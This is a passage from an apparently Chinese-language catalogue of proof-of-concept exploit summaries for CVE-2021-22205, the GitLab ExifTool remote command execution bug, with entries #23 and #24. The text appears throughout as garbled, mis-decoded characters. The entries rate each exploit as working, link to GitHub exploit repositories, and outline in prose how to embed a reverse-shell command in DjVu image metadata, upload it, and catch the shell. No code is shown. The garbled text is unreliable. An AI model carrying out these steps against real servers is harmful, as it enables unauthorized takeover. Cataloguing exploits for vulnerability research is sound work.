æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

